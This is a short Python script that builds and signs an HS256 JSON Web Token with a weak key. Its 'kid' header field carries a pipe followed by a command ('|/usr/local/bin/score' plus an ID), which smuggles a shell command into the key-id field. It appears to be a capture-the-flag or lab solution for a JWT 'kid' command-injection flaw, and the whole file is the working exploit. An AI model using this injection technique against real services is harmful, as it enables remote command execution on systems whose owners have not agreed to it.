import hmac
import base64
import hashlib
import json

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "|/usr/local/bin/score 35516971-8b06-4d5b-bbbe-2d825ed1ee0a"
}

payload = {
    "user": "random"
}

key = b"random"

# Encode header and payload to base64 (without padding)
encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b"=")
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b"=")

# Combine them to create the unsigned token (still in bytes)
jwt_header_payload = encoded_header + b"." + encoded_payload

# Sign the token using HMAC-SHA256
signature = hmac.new(key, jwt_header_payload, hashlib.sha256).digest()
encoded_signature = base64.urlsafe_b64encode(signature).rstrip(b"=")

# Combine all parts and decode for printing
jwt_token = jwt_header_payload + b"." + encoded_signature
print(jwt_token.decode())
